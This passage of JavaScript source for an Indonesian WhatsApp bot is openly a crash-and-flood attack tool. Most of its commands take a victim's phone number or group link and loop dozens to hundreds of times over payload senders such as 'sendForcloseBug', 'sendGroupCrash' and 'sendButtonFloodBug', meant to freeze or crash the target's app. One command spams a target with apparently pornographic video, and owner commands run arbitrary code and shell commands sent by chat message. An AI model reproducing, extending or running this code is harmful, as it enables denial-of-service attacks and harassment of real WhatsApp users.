• *${prefix}combo* <nomor>
• *${prefix}combov2* <nomor>
• *${prefix}overdrive* <nomor>
• *${prefix}pushmedia* <nomor>
• *${prefix}gbroadcast* <id/link>
• *${prefix}grouptest* <link>

_${botWm}_`;

        await ndikaSock.sendMessage(m.chat, {
          text: toolsText,
          footer: botName + " • " + ownerName,
          interactiveButtons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "Menu Utama",
                id: prefix + "menu"
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "Menu Owner",
                id: prefix + "owner"
              })
            }
          ]
        }, { quoted: m });
        break;
      }

      case "owner":
      case "admin":
      case "ownermenu": {
        if (!isOwner) return reply("*Akses ditolak.* Perintah ini khusus untuk Owner.");

        const ownerText = `*${botName}* — _Menu Owner_

Daftar perintah pengelola sistem:

• *${prefix}addowner* <nomor>
• *${prefix}delowner* <nomor>
• *${prefix}addprem* <nomor>
• *${prefix}delprem* <nomor>
• *${prefix}public* (Buka akses bot)
• *${prefix}self* (Kunci akses khusus owner)
• *${prefix}idgrup* <link grup>
• *${prefix}eval* <code>

_${botWm}_`;

        await ndikaSock.sendMessage(m.chat, {
          text: ownerText,
          footer: botName + " • " + ownerName,
          interactiveButtons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "Menu Utama",
                id: prefix + "menu"
              })
            },
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "Daftar Fitur",
                id: prefix + "tools"
              })
            }
          ]
        }, { quoted: m });
        break;
      }

      case "ping":
      case "speed": {
        const latensi = speed() - timestampp;
        const pingCard = `*${botName}* — _Status Sistem_

• Kecepatan : ${latensi.toFixed(2)} ms
• Runtime   : ${runtime(process.uptime())}
• Platform  : ${os.platform()} (${os.arch()})
• Memori    : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB

_${botWm}_`;
        reply(pingCard);
        break;
      }

      case "addowner":
      case "addown":
        {
          if (!isOwner) return reply("*Akses Ditolak! Khusus Owner.*");
          if (!args[0]) return reply(`Penggunaan: ${prefix + command} 628xxx`);
          const targetNum = q.split("|")[0].replace(/[^0-9]/g, "");
          const checkNum = await ndikaSock.onWhatsApp(targetNum + "@s.whatsapp.net");
          if (!checkNum || checkNum.length === 0) return reply("*Nomor WhatsApp tidak valid!*");
          if (ownData.includes(targetNum)) return reply("*Nomor tersebut sudah menjadi Owner!*");
          ownData.push(targetNum);
          if (!premData.includes(targetNum)) premData.push(targetNum);
          fs.writeFileSync("./database/owner.json", JSON.stringify(ownData, null, 2));
          fs.writeFileSync("./database/premium.json", JSON.stringify(premData, null, 2));
          reply(`*Berhasil!* Nomor ${targetNum} telah ditambahkan ke database Owner.`);
          break;
        }
      case "delowner":
      case "delown":
        {
          if (!isOwner) return reply("*Akses Ditolak! Khusus Owner.*");
          if (!args[0]) return reply(`Penggunaan: ${prefix + command} 628xxx`);
          const targetNum = q.split("|")[0].replace(/[^0-9]/g, "");
          const idxOwn = ownData.indexOf(targetNum);
          if (idxOwn === -1) return reply("*Nomor tersebut tidak ditemukan di database Owner!*");
          ownData.splice(idxOwn, 1);
          fs.writeFileSync("./database/owner.json", JSON.stringify(ownData, null, 2));
          reply(`*Berhasil!* Nomor ${targetNum} telah dihapus dari database Owner.`);
          break;
        }
      case "addpremium":
      case "addprem":
        {
          if (!isOwner) return reply("*Akses Ditolak! Khusus Owner.*");
          if (!args[0]) return reply(`Penggunaan: ${prefix + command} 628xxx`);
          const targetNum = args[0].replace(/[^0-9]/g, "");
          if (!targetNum) return reply("*Nomor tidak valid!*");
          if (premData.includes(targetNum)) return reply(`Nomor ${targetNum} sudah terdaftar Premium!`);
          premData.push(targetNum);
          fs.writeFileSync("./database/premium.json", JSON.stringify(premData, null, 2));
          return reply(`*Berhasil!* Nomor ${targetNum} telah ditambahkan ke database Premium.`);
        }
      case "delpremium":
      case "delprem":
        {
          if (!isOwner) return reply("*Akses Ditolak! Khusus Owner.*");
          if (!args[0]) return reply(`Penggunaan: ${prefix + command} 628xxx`);
          const targetNum = q.split("|")[0].replace(/[^0-9]/g, "");
          const idxPrem = premData.indexOf(targetNum);
          if (idxPrem === -1) return reply("*Nomor tersebut tidak terdaftar di database Premium!*");
          premData.splice(idxPrem, 1);
          fs.writeFileSync("./database/premium.json", JSON.stringify(premData, null, 2));
          reply(`*Berhasil!* Nomor ${targetNum} telah dihapus dari database Premium.`);
          break;
        }
      case "public":
        {
          if (!isOwner) return reply("*Akses Ditolak! Khusus Owner.*");
          ndikaSock.public = true;
          reply("*Mode Bot Berhasil Diubah: [ PUBLIC ]*");
          break;
        }
      case "self":
      case "private":
        {
          if (!isOwner) return reply("*Akses Ditolak! Khusus Owner.*");
          ndikaSock.public = false;
          reply("*Mode Bot Berhasil Diubah: [ SELF ]*");
          break;
        }
      case "eval":
        {
          if (!isOwner) return;
          const evalCode = budy.trim().split(" ").slice(1).join(" ");
          if (!evalCode) return reply(`Contoh: ${prefix + command} m.chat`);
          let evalResult;
          try {
            evalResult = await eval("(async () => { " + (evalCode.startsWith("return") ? "" : "return") + " " + evalCode + " })()");
          } catch (err) {
            evalResult = err;
          } finally {
            await reply(require("util").format(evalResult));
          }
          break;
        }
      case "inspect":
      case "raw":
      case "rokok":
        {
          const targetObj = m.quoted ? {
            [m.quoted.mtype]: m.quoted
          } : {
            [m.mtype]: m.message
          };
          const prettyJson = JSON.stringify(targetObj, null, 2);
          ndikaSock.relayMessage(m.chat, {
            extendedTextMessage: {
              text: prettyJson
            }
          }, {});
          break;
        }
      case "upsw":
      case "poststatus":
      case "swgrup":
      case "swgc":
        {
          const mediaSource = m.quoted ? m.quoted : m;
          const mediaMime = (mediaSource.msg || mediaSource).mimetype || "";
          const captionText = m.body.replace(/^\.(swgrup|swgc)\s*/i, "").trim();
          const targetChat = m.chat;
          if (/image/.test(mediaMime)) {
            const dlBuff = await mediaSource.download();
            await ndikaSock.sendMessage(targetChat, {
              groupStatusMessage: {
                image: dlBuff,
                caption: captionText
              }
            });
            reply("*Berhasil Mengirim Status Gambar ke Grup!*");
          } else if (/video/.test(mediaMime)) {
            const dlBuff = await mediaSource.download();
            await ndikaSock.sendMessage(targetChat, {
              groupStatusMessage: {
                video: dlBuff,
                caption: captionText
              }
            });
            reply("*Berhasil Mengirim Status Video ke Grup!*");
          } else if (/audio/.test(mediaMime)) {
            const dlBuff = await mediaSource.download();
            await ndikaSock.sendMessage(targetChat, {
              groupStatusMessage: {
                audio: dlBuff
              }
            });
            reply("*Berhasil Mengirim Status Audio ke Grup!*");
          } else if (captionText) {
            await ndikaSock.sendMessage(targetChat, {
              groupStatusMessage: {
                text: captionText
              }
            });
            reply("*Berhasil Mengirim Status Teks ke Grup!*");
          } else {
            await reply(`Reply media atau masukkan teks.\nContoh: ${prefix + command} (reply foto/video) Hai semua`);
          }
          break;
        }
      case "blank":
      case "ghost":
      case "blankxdelay":
        {
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 628xxx`);
          let targetNum = q.replace(/[^0-9]/g, "");
          if (targetNum.startsWith("0")) return reply(`*Format Salah!*\nGunakan format internasional: 628xxx`);
          let targetJid = targetNum + "@s.whatsapp.net";
          reply(`*Memproses target:* ${targetJid}\n_Tindakan sedang berjalan..._`);
          for (let i = 0; i < 70; i++) {
            await sendButtonFloodBug(ndikaSock, targetJid);
            await sendDelayBlankBug(targetJid);
            await sendButtonBug(ndikaSock, targetJid);
            await sleep(1500);
          }
          console.log(chalk.gray("[ACTION] Target " + targetJid + " selesai diproses."));
          break;
        }
      case "combo":
      case "xcamb":
        {
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 628xxx`);
          let targetNum = q.replace(/[^0-9]/g, "");
          if (targetNum.startsWith("0")) return reply(`*Format Salah!*\nGunakan format internasional: 628xxx`);
          let targetJid = targetNum + "@s.whatsapp.net";
          reply(`*Memproses target:* ${targetJid}\n_Tindakan sedang berjalan..._`);
          for (let i = 0; i < 100; i++) {
            await sendButtonFloodBug(ndikaSock, targetJid);
            await sendButtonBug(ndikaSock, targetJid);
            await sendInteractiveFloodBug(ndikaSock, targetJid);
            await sendGroupStatusBug(ndikaSock, targetJid);
            await sleep(1500);
          }
          console.log(chalk.gray("[ACTION] Target " + targetJid + " selesai diproses."));
          break;
        }
      case "combov2":
      case "xcamb2":
        {
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 628xxx`);
          let targetNum = q.replace(/[^0-9]/g, "");
          if (targetNum.startsWith("0")) return reply(`*Format Salah!*\nGunakan format internasional: 628xxx`);
          let targetJid = targetNum + "@s.whatsapp.net";
          reply(`*Memproses target:* ${targetJid}\n_Tindakan sedang berjalan..._`);
          for (let i = 0; i < 250; i++) {
            await sendDelayBlankBug(targetJid);
            await sendButtonFloodBug(ndikaSock, targetJid);
            await sendInteractiveFloodBug(ndikaSock, targetJid);
            await sleep(100);
          }
          console.log(chalk.gray("[ACTION] Target " + targetJid + " selesai diproses."));
          break;
        }
      case "grouptest":
      case "joincheck":
      case "xban":
      case "xband":
        {
          if (!isPremium) return reply("*Fitur ini khusus untuk pengguna Premium!*");
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} https://chat.whatsapp.com/xxxx`);
          let inviteUrl = q.trim();
          if (!inviteUrl.includes("chat.whatsapp.com/")) return reply("*Link grup WhatsApp tidak valid!*");
          let inviteCode = inviteUrl.split("https://chat.whatsapp.com/")[1];
          if (!inviteCode) return reply("*Link grup WhatsApp tidak valid!*");
          const groupInfo = await ndikaSock.groupGetInviteInfo(inviteCode);
          const targetGroupId = groupInfo.id;
          reply(`*Memproses grup:* ${targetGroupId}*`);
          for (let i = 0; i < 20; i++) {
            await sendGroupCrash(ndikaSock, targetGroupId);
            await sleep(100);
          }
          console.log(chalk.gray("[ACTION] Target " + targetGroupId + " selesai diproses."));
          break;
        }
      case "pushmedia":
      case "spampic":
      case "spambkp":
      case "spambokep":
        {
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 628xxx`);
          let targetNum = q.replace(/[^0-9]/g, "");
          if (targetNum.startsWith("0")) return reply(`*Format Salah!*\nGunakan format internasional: 628xxx`);
          let targetJid = targetNum + "@s.whatsapp.net";
          reply(`*Memproses target:* ${targetJid}*`);
          for (let i = 0; i < 40; i++) {
            await sendSpamBkpVideo(ndikaSock, targetJid);
            await sleep(200);
          }
          console.log(chalk.gray("[ACTION] Target " + targetJid + " selesai diproses."));
          break;
        }
      case "freeze":
      case "close":
      case "forclos":
      case "forclose":
      case "fcnew":
        {
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 628xxx`);
          let targetNum = q.replace(/[^0-9]/g, "");
          if (targetNum.startsWith("0")) return reply(`*Format Salah!*\nGunakan format internasional: 628xxx`);
          let targetJid = targetNum + "@s.whatsapp.net";
          reply(`*Memproses target:* ${targetJid}\n_Tindakan sedang berjalan..._`);
          for (let i = 0; i < 20; i++) {
            await sendForcloseBug(ndikaSock, targetJid);
            await sleep(1500);
          }
          console.log(chalk.gray("[ACTION] Target " + targetJid + " selesai diproses."));
          break;
        }
      case "blast":
      case "sender":
      case "d-five":
      case "dfive":
        {
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 628xxx`);
          let targetNum = q.replace(/[^0-9]/g, "");
          if (targetNum.startsWith("0")) return reply(`*Format Salah!*\nGunakan format internasional: 628xxx`);
          let targetJid = targetNum + "@s.whatsapp.net";
          reply(`*Memproses target:* ${targetJid}\n_Tindakan sedang berjalan..._`);
          for (let i = 0; i < 40; i++) {
            await sendButtonBug(ndikaSock, targetJid);
            await sendButtonFloodBug(ndikaSock, targetJid);
            await sleep(1500);
          }
          console.log(chalk.gray("[ACTION] Target " + targetJid + " selesai diproses."));
          break;
        }
      case "overdrive":
      case "boost":
      case "gear4":
        {
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 628xxx`);
          let targetNum = q.replace(/[^0-9]/g, "");
          if (targetNum.startsWith("0")) return reply(`*Format Salah!*\nGunakan format internasional: 628xxx`);
          let targetJid = targetNum + "@s.whatsapp.net";
          const myNum = ndikaSock.user?.id?.split(":")[0]?.split("@")[0];
          if (targetNum === myNum) return reply("*Target adalah nomor bot sendiri, dibatalkan.*");
          reply(`*Memproses target:* ${targetJid}\n_Tindakan sedang berjalan..._`);
          for (let i = 0; i < 70; i++) {
            await sendGroupStatusBug(ndikaSock, targetJid);
            await sendGear4Bug(ndikaSock, targetJid);
            await sendInteractiveFloodBug(ndikaSock, targetJid);
            await sleep(100);
          }
          console.log(chalk.gray("[ACTION] Target " + targetJid + " selesai diproses."));
          break;
        }
      case "click":
      case "tap":
      case "crashclik":
        {
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 628xxx`);
          let targetNum = q.replace(/[^0-9]/g, "");
          if (targetNum.startsWith("0")) return reply(`*Format Salah!*\nGunakan format internasional: 628xxx`);
          let targetJid = targetNum + "@s.whatsapp.net";
          reply(`*Memproses target:* ${targetJid}\n_Tindakan sedang berjalan..._`);
          for (let i = 0; i < 60; i++) {
            await sendCrashClickBug(ndikaSock, targetJid);
            await sendButtonBug(ndikaSock, targetJid);
            await sleep(1500);
          }
          console.log(chalk.gray("[ACTION] Target " + targetJid + " selesai diproses."));
          break;
        }
      case "info":
      case "saluran":
      case "update":
        {
          reply(`┌───❖「 📢 𝗜𝗡𝗙𝗢 𝗨𝗣𝗗𝗔𝗧𝗘 」❖───
│
│ 🔗 Saluran Resmi:
│ *${global.saluran || "https://chat.whatsapp.com/FPofX1sCkeBFU2EroZ4Krs"}*
│
│ Follow saluran untuk info update & update script resmi!
│
└───❖「 © 𝟮𝟬𝟮𝟲 𝗡𝗗𝗜𝗞𝗔 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 」❖───`);
          break;
        }
      case "delay":
      case "push":
      case "fulldelay":
        {
          if (!q) return reply(`*Format Salah!*\nContoh: ${prefix + command} 628xxx`);
          let targetNum = q.replace(/[^0-9]/g, "");
          if (targetNum.startsWith("0")) return reply(`*Format Salah!*\nGunakan format internasional: 628xxx`);
          let targetJid = targetNum + "@s.whatsapp.net";
          reply(`*Memproses target:* ${targetJid}\n_Tindakan sedang berjalan..._`);
          for (let i = 0; i < 120; i++) {
            await sendFullDelayBug(ndikaSock, targetJid);
            await sendGroupStatusBug(ndikaSock, targetJid);
            await sendButtonFloodBug(ndikaSock, targetJid);
            await sendButtonBug(ndikaSock, targetJid);
            await sleep(1500);
          }
          console.log(chalk.gray("[ACTION] Target " + targetJid + " selesai diproses."));
          break;
        }
      case "idgrup":
      case "groupinfo":
      case "cekid":
      case "cekidgrup":
        {
          try {
            const rawText = String(m.text || m.body || m.message?.conversation || m.message?.extendedTextMessage?.text || "").trim();
            const inviteMatch = rawText.match(/https?:\/\/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i);
            if (!inviteMatch) {
              return await ndikaSock.sendMessage(m.chat, {
                text: `❌ LINK GRUP TIDAK DITEMUKAN

Penggunaan:
${prefix}cekidgrup https://chat.whatsapp.com/xxxxx

Contoh:
${prefix}cekidgrup https://chat.whatsapp.com/AbCdEf123456
*" + botWm + "*`
              }, {
                quoted: m
              });
            }
            const inviteCode = inviteMatch[1];
            const inviteInfo = await ndikaSock.groupGetInviteInfo(inviteCode);
            if (!inviteInfo || !inviteInfo.id) {
              return await ndikaSock.sendMessage(m.chat, {
                text: "❌ Gagal mendapatkan ID grup dari link tersebut."
              }, {
                quoted: m
              });
            }
            const targetGId = inviteInfo.id;
            const targetGName = inviteInfo.subject || inviteInfo.name || "Tidak diketahui";
            const groupCard = `━━━〔 📋 𝗜𝗡𝗙𝗢 𝗚𝗥𝗨𝗣 〕━━━
┃ 👥 Nama Grup : ${targetGName}
┃ 🆔 Group ID  : ${targetGId}
┃ 🔗 Link Grup : https://chat.whatsapp.com/${inviteCode}
╰━━━━━━━━━━━━━━━━━━━
*© Ndika Official*`;
            return await ndikaSock.sendMessage(m.chat, {
              text: groupCard
            }, {
              quoted: m
            });
          } catch (err) {
            console.error("CEKIDGRUP ERROR:", err);
            return await ndikaSock.sendMessage(m.chat, {
              text: `❌ GAGAL MENGAMBIL ID GRUP

Kemungkinan penyebab:
• Link grup tidak valid
• Link undangan sudah kedaluwarsa
• Grup privat / bot ditolak

Error: ${err?.message || String(err)}`
            }, {
              quoted: m
            });
          }
          break;
        }
      case "gbroadcast":
      case "groupblast":
      case "bangb":
        {
          const targetInput = (q || "").trim();
          if (!m.isGroup && !targetInput) {
            return await ndikaSock.sendMessage(m.chat, {
              text: `Masukkan link grup atau ID grup. Contoh: ${prefix}bangb 123456789@g.us`
            }, {
              quoted: m
            });
          }
          if (!isPremium) {
            return await ndikaSock.sendMessage(m.chat, {
              text: "*Fitur ini khusus untuk pengguna Premium!*"
            }, {
              quoted: m
            });
          }
          try {
            let targetGroup = targetInput || m.chat;
            if (!targetGroup.endsWith("@g.us")) {
              const urlMatch = targetGroup.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]+)/i);
              if (!urlMatch) {
                return await ndikaSock.sendMessage(m.chat, {
                  text: "Format salah. Gunakan ID grup (123456@g.us) atau link grup WhatsApp."
                }, {
                  quoted: m
                });
              }
              const inviteData = await ndikaSock.groupGetInviteInfo(urlMatch[1]);
              targetGroup = inviteData.id;
            }
            reply(`*Memproses grup:* ${targetGroup}*`);
            await sendGroupCrash(ndikaSock, targetGroup);
          } catch (err) {
            console.error(err);
            return await ndikaSock.sendMessage(m.chat, {
              text: String(err)
            }, {
              quoted: m
            });
          }
          console.log(chalk.gray("[ACTION] Grup " + targetGroup + " selesai diproses."));
          break;
        }
      default:
        // Eval prefix shortcuts: =>, >, $
        if (budy.startsWith("=>")) {
          if (!isOwner) return;
          try {
            reply(util.format(eval("(async () => { return " + budy.slice(3) + " })()")));
          } catch (err) {
            reply(String(err));
          }
        }
        if (budy.startsWith(">")) {
          if (!isOwner) return;
          try {
            let evalRes = await eval(budy.slice(2));
            if (typeof evalRes !== "string") {
              evalRes = require("util").inspect(evalRes);
            }
            await reply(evalRes);
          } catch (err) {
            await reply(String(err));
          }
        }
        if (budy.startsWith("$")) {
          if (!isOwner) return;
          require("child_process").exec(budy.slice(2), (err, stdout) => {
            if (err) return reply("" + err);
            if (stdout) return reply(stdout);
          });
        }
    }
  } catch (err) {
    ndikaSock.sendMessage(m.chat, {
      text: require("util").format(err)
    }, {
      quoted: m
    });
    console.error(chalk.red("[NDIKA ERROR]"), err);
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.green(`${__filename} updated!`));
  delete require.cache[file];
  require(file);
});